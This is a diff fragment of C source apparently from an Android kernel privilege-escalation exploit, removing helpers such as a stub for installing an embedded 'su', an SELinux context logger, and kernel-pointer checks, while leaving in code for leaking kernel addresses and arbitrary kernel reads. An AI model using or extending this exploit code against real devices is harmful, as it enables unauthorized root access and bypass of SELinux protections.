@@ -53,29 +53,10 @@ void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
-uintptr_t current_kernelsnitch_mm_struct(void) {
-  return ks->mm_struct;
-}
-
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
   return leaked;
-}
-
-__attribute__((weak))
-int install_embedded_su(pid_t *daemon_pid) {
-  if (daemon_pid) {
-    *daemon_pid = -1;
-  }
-  errno = ENOSYS;
-  return 0;
-}
-
-__attribute__((weak))
-int install_embedded_wallpaper(void) {
-  errno = ENOSYS;
-  return 0;
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -150,17 +131,6 @@ void log_startup_context(void) {
              (unsigned long long)SLIDE_INIT_TASK,
              (unsigned long long)SLIDE_ROOT_TASK_GROUP,
              (unsigned long long)SLIDE_SYSCTL_BOOTID);
-}
-
-void log_slide_child_context(void) {
-  char attr[256];
-  char enforce[32];
-  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
-  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
-  pr_success("slide child context route=%s pid=%d uid=%u euid=%u gid=%u "
-             "egid=%u attr=%s enforce=%s\n",
-             "pselect", getpid(), getuid(), geteuid(), getgid(), getegid(),
-             attr, enforce);
 }
 
 void disable_rseq_for_thread(void) {
@@ -247,15 +217,6 @@ void init_ashmem_path(void) {
 
 int open_ashmem_device(void) {
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
-}
-
-int has_zero_byte(uintptr_t value) {
-  for (int i = 0; i < 8; i++) {
-    if (((value >> (i * 8)) & 0xff) == 0) {
-      return 1;
-    }
-  }
-  return 0;
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
@@ -809,10 +770,6 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   errno = 0;
   ssize_t rd = pread(fd, data, len, pos);
   return rd;
-}
-
-int is_kernel_ptr(uintptr_t value) {
-  return value >= 0xffff800000000000ULL;
 }
 
 int is_direct_ptr(uintptr_t value) {
